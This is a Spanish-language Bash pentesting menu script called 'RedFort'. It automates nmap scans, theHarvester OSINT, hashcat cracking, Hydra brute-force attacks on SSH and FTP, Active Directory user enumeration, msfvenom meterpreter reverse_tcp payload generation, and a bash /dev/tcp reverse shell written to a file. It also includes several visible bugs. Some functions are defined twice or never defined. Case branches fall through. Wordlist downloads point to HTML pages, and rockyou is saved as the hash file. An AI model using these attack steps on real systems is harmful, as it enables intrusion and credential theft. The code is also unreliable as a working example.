#!/bin/bash

function iniciar_sesion() {
    session_dir="reportes/reportes_herramientas"
    complete_report_dir="reportes/reporte_completo"
    
    mkdir -p "$session_dir"
    mkdir -p "$complete_report_dir"
    
    session_log="$session_dir/session_log.txt"
    touch "$session_log"
    
    session_id=$(date +"%Y%m%d_%H%M%S")
    echo "Sesión de pentesting iniciada. ID de sesión: $session_id"
}

session_log="session_log.txt"

function instalar_herramientas() {
    if [ ! -f ".tools_installed" ]; then
        echo "Actualizando el sistema..."
        sudo apt update && sudo apt upgrade -y

        echo "Verificando herramientas necesarias..."

        herramientas=(nmap hashcat theharvester metasploit-framework hydra python3 sublist3r)

        for herramienta in "${herramientas[@]}"; do
            if ! command -v $herramienta &> /dev/null; then
                echo "$herramienta no está instalado. Instalando..."
                if [[ "$herramienta" == "metasploit-framework" ]]; then
                    curl -sSL https://raw.githubusercontent.com/rapid7/metasploit-framework/master/msfupdate > msfupdate.sh
                    bash msfupdate.sh
                else
                    sudo apt-get install -y $herramienta
                fi
            else
                echo "$herramienta ya está instalado."
            fi
        done

        touch .tools_installed
        echo "Todas las herramientas necesarias han sido verificadas e instaladas."
    else
        echo "Las herramientas ya han sido instaladas."
    fi
}

function menu_principal() {
    iniciar_sesion

    clear
    echo "========================"
    echo -e "\e[31m"
    figlet "RedFort"
    echo -e "\e[0m"
    echo "                        by GarboX0"
    echo "========================"
    echo "1. Enumeración Automatizada (NMAP, OSINT)"
    echo "2. Generación de Payloads y Reverse Shells"
    echo "3. Cracking de Hashes"
    echo "4. CheatSheets"
    echo "5. Herramientas de Active Directory"
    echo "6. Ataques de Fuerza Bruta (Hydra)"
    echo "7. Escáner de Subdominios"
    echo "8. Generar Reporte"
    echo "9. Salir"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) submenu_enumeracion ;;
        2) submenu_payloads ;;
        3) submenu_hashes ;;
        4) submenu_cheatsheets ;;
        5) submenu_ad ;;
        6) submenu_fuerza_bruta ;;
        7) submenu_subdominios ;;
        8) generar_reporte_general ;;
        9) exit 0 ;;
        *) echo "Opción inválida!" && sleep 2 && menu_principal ;;
    esac
}

function submenu_enumeracion() {
    clear
    echo "========================"
    echo "   Enumeración Automatizada"
    echo "========================"
    echo "1. Escaneo rápido con NMAP"
    echo "2. Escaneo de puertos con NMAP"
    echo "3. Enumeración OSINT (theHarvester)"
    echo "4. Volver al Menú Principal"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) nmap_scan_rapido ;;
        2) nmap_scan_puertos ;;
        3) osint_harvester ;;
        4) menu_principal ;;
        *) echo "Opción inválida!" && sleep 2 && submenu_enumeracion ;;
    esac
}

function nmap_scan_rapido() {
    nmap_log="$session_dir/nmap_scan_rapido_$(date +"%Y-%m-%d_%H-%M").txt" 
    read -p "Ingresa la IP o rango a escanear: " ip
    echo "Ejecutando Nmap scan rápido en $ip..." | tee -a "$nmap_log"
    sudo nmap -sP "$ip" | tee -a "$nmap_log"
    
    echo "==== NMAP Quick Scan ====" >> "$session_log"
    echo "Nmap scan rápido ejecutado en $ip" | tee -a "$session_log"
    cat "$nmap_log" >> "$session_log"
    echo "================================" >> "$session_log"
    
    read -p "Presiona Enter para continuar..." && submenu_enumeracion
}

function nmap_scan_puertos() {
    nmap_ports_log="$session_dir/nmap_scan_puertos_$(date +"%Y-%m-%d_%H-%M").txt"
    read -p "Ingresa la IP o rango a escanear: " ip
    echo "Ejecutando Nmap scan de puertos en $ip..." | tee -a "$nmap_ports_log"
    sudo nmap -sS "$ip" | tee -a "$nmap_ports_log"
    
    echo "==== NMAP Port Scanner ====" >> "$session_log"
    echo "Nmap scan de puertos ejecutado en $ip." | tee -a "$session_log"
    cat "$nmap_ports_log" >> "$session_log"
    echo "================================" >> "$session_log"
    
    read -p "Presiona Enter para continuar..." && submenu_enumeracion
}

function osint_harvester() {
    osint_log="$session_dir/osint_harvester_$(date +"%Y-%m-%d_%H-%M").txt"
    read -p "Ingresa el dominio para el escaneo OSINT: " dominio
    echo "Ejecutando TheHarvester en $dominio..." | tee -a "$osint_log"
    sudo theHarvester -d "$dominio" -l 500 -b all | tee -a "$osint_log"
    
    echo "==== OSINT Harvester ====" >> "$session_log"
    echo "OSINT ejecutado en $dominio." | tee -a "$session_log"
    cat "$osint_log" >> "$session_log"
    echo "================================" >> "$session_log"
    
    read -p "Presiona Enter para continuar..." && submenu_enumeracion
}

function submenu_hashes() {
    clear
    echo "========================"
    echo "   Cracking de Hashes"
    echo "========================"
    echo "1. Descargar y usar hash.txt por defecto"
    echo "2. Cargar hashes desde archivo local"
    echo "3. Crackear Hash con Hashcat"
    echo "4. Detectar tipo de Hash"
    echo "5. Volver al Menú Principal"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) descargar_y_generar_hashes ;;
        2) cargar_hashes ;;
        3) crackear_hash ;;
        4) detectar_tipo_hash ;;
        5) menu_principal ;;
        *) echo "Opción inválida!" && sleep 2 && submenu_hashes ;;
    esac
}

function descargar_y_generar_hashes() {
    echo "Descargando lista de hashes por defecto..."
    curl -o "$session_dir/hash.txt" "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt"
    echo "Lista de hashes descargada como hash.txt."

    echo "==== Hash Downloader ====" >> "$session_log"
    echo "Ejecutando Hashcat..." | tee -a "$session_log"
    if sudo hashcat -m 0 "$session_dir/hash.txt" "$session_dir/rockyou.txt" | tee -a "$session_log"; then
        echo "Hashcat ejecutado con éxito." | tee -a "$session_log"
    else
        echo "Error al ejecutar Hashcat." | tee -a "$session_log"
    fi
}

function cargar_hashes() {
    read -p "Ingresa la ruta del archivo de hashes: " ruta_archivo

    if [ -f "$ruta_archivo" ]; then
        cp "$ruta_archivo" "$session_dir/hash.txt" 
        echo "Hashes cargados desde $ruta_archivo." | tee -a "$session_log"

        echo "==== Hash Uploader ====" >> "$session_log"
        echo "Ejecutando Hashcat..." | tee -a "$session_log"
        sudo hashcat -m 0 "$session_dir/hash.txt" "$session_dir/rockyou.txt" | tee -a "$session_log"
        echo "Hashcat ejecutado en $ruta_archivo." | tee -a "$session_log"
    else
        echo "El archivo no existe. Por favor verifica la ruta." | tee -a "$session_log"
    fi
}

function crackear_hash() {
    hashcat_log="$session_dir/hashcat_log_$(date +"%Y-%m-%d_%H-%M").txt"
    read -p "Ingresa el archivo de hashes: " archivo
    read -p "Ingresa el wordlist a usar: " wordlist
    echo "Ejecutando Hashcat en $archivo con la wordlist $wordlist..." | tee -a "$hashcat_log"
    sudo hashcat -a 0 -m 0 "$archivo" "$wordlist" | tee -a "$hashcat_log"

    echo "==== Hash Cracker ====" >> "$session_log"
    echo "Hashcat ejecutado en $archivo con la wordlist $wordlist." | tee -a "$session_log"
    cat "$hashcat_log" >> "$session_log"
    echo "================================" >> "$session_log"
    
    read -p "Presiona Enter para continuar..." && submenu_hashes
}

function detectar_tipo_hash() {
    hash_log="$session_dir/hash_detection_log_$(date +"%Y-%m-%d_%H-%M").txt"
    read -p "Ingresa el hash: " hash
    sudo hashid -m "$hash" | tee -a "$hash_log"

    echo "==== Hash Detector ====" >> "$session_log"
    echo "Tipo de hash detectado: $hash." | tee -a "$session_log"
    cat "$hash_log" >> "$session_log"
    echo "================================" >> "$session_log"
    
    read -p "Presiona Enter para continuar..." && submenu_hashes
}

function submenu_payloads() {
    clear
    echo "========================"
    echo "   Generación de Payloads y Reverse Shells"
    echo "========================"
    echo "1. Generar Payload con msfvenom"
    echo "2. Crear Reverse Shell en Bash"
    echo "3. Volver al Menú Principal"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) generar_payload ;;&
        2) crear_reverse_shell ;;&
        3) menu_principal ;;&
        *) echo "Opción inválida!" && sleep 2 && submenu_payloads ;;&
    esac
}

function generar_payload() {
    payload_log="$session_dir/payload_log_$(date +"%Y-%m-%d_%H-%M").txt"
    read -p "Ingresa tu IP (LHOST): " ip
    read -p "Ingresa el puerto a usar (LPORT): " puerto
    echo "Generando payload con msfvenom..." | tee -a "$payload_log"
    sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST="$ip" LPORT="$puerto" -f exe > payload.exe
    
    echo "==== Payload Generator ====" >> "$session_log"
    echo "Payload generado: payload.exe" | tee -a "$payload_log"
    echo "Payload generado con msfvenom (LHOST: $ip, LPORT: $puerto)" | tee -a "$session_log"
    cat "$payload_log" >> "$session_log"
    echo "================================" >> "$session_log"
    
    read -p "Presiona Enter para continuar..." && submenu_payloads
}

function crear_reverse_shell() {
    echo "==== Reverse Shell ====" >> "$session_log"
    read -p "Ingresa tu IP: " ip
    read -p "Ingresa el puerto: " puerto
    echo "bash -i >& /dev/tcp/$ip/$puerto 0>&1" > reverse_shell.sh

    echo "==== Reverse Shell ====" >> "$session_log"
    echo "Reverse shell creado en reverse_shell.sh." | tee -a "$session_log"
    echo "Reverse shell creado (IP: $ip, Puerto: $puerto)." | tee -a "$session_log"
    echo "================================" >> "$session_log"

    read -p "Presiona Enter para continuar..." && submenu_payloads
}

function submenu_hashes() {
    clear
    echo "========================"
    echo "   Cracking de Hashes"
    echo "========================"
    echo "1. Crackear Hash con Hashcat"
    echo "2. Detectar tipo de Hash"
    echo "3. Volver al Menú Principal"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) crackear_hash ;;&
        2) detectar_tipo_hash ;;&
        3) menu_principal ;;&
        *) echo "Opción inválida!" && sleep 2 && submenu_hashes ;;&
    esac
}

function submenu_cheatsheets() {
    clear
    echo "========================"
    echo "   Cheatsheets"
    echo "========================"
    echo "1. Linux Cheatsheet"
    echo "2. Windows Cheatsheet"
    echo "3. Pivoting & Transferencia de Archivos"
    echo "4. Volver al Menú Principal"
    echo ""

    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) cat cheatsheets/linux.txt ;;&
        2) cat cheatsheets/windows.txt ;;&
        3) cat cheatsheets/pivoting.txt ;;&
        4) menu_principal ;;&
        *) echo "Opción inválida!" && sleep 2 && submenu_cheatsheets ;;&
    esac

    read -p "Presiona Enter para continuar..." && submenu_cheatsheets
}

function submenu_ad() {
    clear
    echo "========================"
    echo "   Herramientas de Active Directory"
    echo "========================"
    echo "1. Enumerar usuarios AD"
    echo "2. Enumerar grupos AD"
    echo "3. Volver al Menú Principal"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) enumerar_usuarios_ad ;;
        2) enumerar_grupos_ad ;;
        3) menu_principal ;;
        *) echo "Opción inválida!" && sleep 2 && submenu_ad ;;
    esac
}

function enumerar_usuarios_ad() {
    enum_log="$session_dir/enum_user_log_$(date +"%Y-%m-%d_%H-%M").txt"
    read -p "Ingresa la IP del DC: " dc_ip
    read -p "Ingresa el dominio (domain): " dominio
    read -p "Ingresa el usuario: " usuario
    read -s -p "Ingresa la contraseña: " password
    echo
    sudo python3 GetADUsers.py -dc-ip "$dc_ip" "$dominio/$usuario:$password" | tee -a "$enum_log"
    
    echo "==== User Enumerate ====" >> "$session_log"
    echo "Usuarios enumerados desde $dc_ip para el dominio $dominio" | tee -a "$session_log"
    cat "$enum_log" >> "$session_log"
    echo "================================" >> "$session_log"
    
    read -p "Presiona Enter para continuar..." && submenu_ad
}


function submenu_fuerza_bruta() {
    clear
    echo "========================"
    echo "   Ataques de Fuerza Bruta"
    echo "========================"
    echo "1. Ataque SSH con Hydra"
    echo "2. Ataque FTP con Hydra"
    echo "3. Volver al Menú Principal"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) ataque_ssh ;;
        2) ataque_ftp ;;
        3) menu_principal ;;
        *) echo "Opción inválida!" && sleep 2 && submenu_fuerza_bruta ;;
    esac
}

function ataque_ssh() {
    ssh_log="$session_dir/ssh_attack_log_$(date +"%Y-%m-%d_%H-%M").txt"
    read -p "Ingresa la IP de la víctima: " ip
    read -p "Ingresa el archivo de usuarios (deja en blanco para usar el predeterminado): " usuarios
    read -p "Ingresa el archivo de contraseñas (deja en blanco para usar el predeterminado): " contrasenas

    if [ -z "$usuarios" ]; then
        if [ ! -f "userlist.txt" ]; then
            echo "Descargando lista de usuarios predeterminada..."
            curl -o userlist.txt "https://github.com/jeanphorn/wordlist/blob/master/usernames.txt"
        fi
        usuarios="userlist.txt"
        echo "Usando la lista de usuarios predeterminada: $usuarios"
    fi

    if [ -z "$contrasenas" ]; then
        if [ ! -f "wordlist.txt" ]; then
            echo "Descargando lista de contraseñas predeterminada..."
            curl -o wordlist.txt "https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10k-most-common.txt"
        fi
        contrasenas="wordlist.txt"
        echo "Usando la lista de contraseñas predeterminada: $contrasenas"
    fi

    sudo hydra -L "$usuarios" -P "$contrasenas" -t 4 ssh://"$ip" -o "$ssh_log"
    
    if [ -f "$ssh_log" ] && grep -q "login:" "$ssh_log"; then
        echo "Ataque SSH exitoso en $ip. Detalles guardados en $ssh_log." | tee -a "$session_log"
    else
        echo "Ataque SSH fallido en $ip. Detalles guardados en $ssh_log." | tee -a "$session_log"
    fi
    
    echo "==== SSH Attack ====" >> "$session_log"
    cat "$ssh_log" >> "$session_log"
    echo "================================" >> "$session_log"
    
    read -p "Presiona Enter para continuar..." && submenu_fuerza_bruta
}


function ataque_ftp() {
    ftp_log="$session_dir/ftp_attack_log_$(date +"%Y-%m-%d_%H-%M").txt"
    read -p "Ingresa la IP de la víctima: " ip
    read -p "Ingresa el archivo de usuarios: " usuarios
    read -p "Ingresa el archivo de contraseñas: " contrasenas

    if [ ! -f "$usuarios" ]; then
        echo "El archivo de usuarios no existe."
        return
    fi

    if [ ! -f "$contrasenas" ]; then
        echo "El archivo de contraseñas no existe."
        return
    fi

    sudo hydra -L "$usuarios" -P "$contrasenas" ftp://"$ip" -o "$ftp_log"
    echo "Ataque FTP ejecutado en $ip usando $usuarios y $contrasenas. Ver detalles en $ftp_log." | tee -a "$session_log"
    
    echo "==== FTP Attack ====" >> "$session_log"
    cat "$ftp_log" >> "$session_log"
    echo "================================" >> "$session_log"
    
    read -p "Presiona Enter para continuar..." && submenu_fuerza_bruta
}


function submenu_subdominios() {
    clear
    echo "========================"
    echo "   Escáner de Subdominios"
    echo "========================"
    echo "1. Escaneo de Subdominios"
    echo "2. Volver al Menú Principal"
    echo ""
    read -p "Selecciona una opción: " opcion

    case $opcion in
        1) escanear_subdominios ;;
        2) menu_principal ;;
        *) echo "Opción inválida!" && sleep 2 && submenu_subdominios ;;
    esac
}

function escanear_subdominios() {
    subdomain_log="$session_dir/subdomain_scan_log_$(date +"%Y-%m-%d_%H-%M").txt"
    read -p "Ingresa el dominio objetivo: " dominio
    sudo sublist3r -d "$dominio" | tee -a "$subdomain_log"
    echo "Escaneo de subdominios ejecutado para $dominio. Ver detalles en $subdomain_log." | tee -a "$session_log"
    
    echo "==== Subdomain Scanner ====" >> "$session_log"
    cat "$subdomain_log" >> "$session_log"
    echo "================================" >> "$session_log"
    
    read -p "Presiona Enter para continuar..." && submenu_subdominios
}


function generar_reporte_general() {
    local report_name="$complete_report_dir/reporte_general_${session_id}.txt"

    if [ -f "$session_log" ]; then
        {
            echo "==== Reporte General de Pentesting ===="
            echo "Fecha: $(date +"%Y-%m-%d %H:%M:%S")"
            echo "ID de Sesión: $session_id"
            echo "Nombre del Pentester: $USER"
            echo ""
            echo "==== Resumen de la Sesión ===="
            cat "$session_log"
            echo ""
            echo "==== Análisis de Resultados ===="
            echo "Se recomienda revisar los logs y vulnerabilidades encontradas."
            echo ""
            echo "==== Recomendaciones ===="
            echo "Asegúrate de verificar las configuraciones de seguridad encontradas en los logs."
        } > "$report_name"
        
        echo "Reporte general generado: $report_name"
    else
        echo "Error: No se encontró el archivo session_log.txt."
    fi
}

function ejecutar_herramientas() {
    echo "Iniciando la ejecución automatizada de herramientas..." | tee -a "$session_log"
    
    echo "==== Inicio de la sesión: $(date) ====" > "$session_log"
    
    echo "Ejecutando Nmap..." | tee -a "$session_log"
    sudo nmap -sP "$target_ip" | tee -a "$session_log"
    
    if [ ! -f "hash.txt" ]; then
        echo "Descargando lista de hashes por defecto..." | tee -a "$session_log"
        curl -o hash.txt "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Leaked-Databases/rockyou.txt"
        echo "Lista de hashes descargada como hash.txt." | tee -a "$session_log"
    else
        echo "Usando hash.txt existente." | tee -a "$session_log"
    fi
    
    echo "Ejecutando Hashcat..." | tee -a "$session_log"
    sudo hashcat -m 0 hash.txt rockyou.txt | tee -a "$session_log"
    
    echo "Generando reporte..." | tee -a "$session_log"
    generar_reporte
}

bienvenida
menu_principal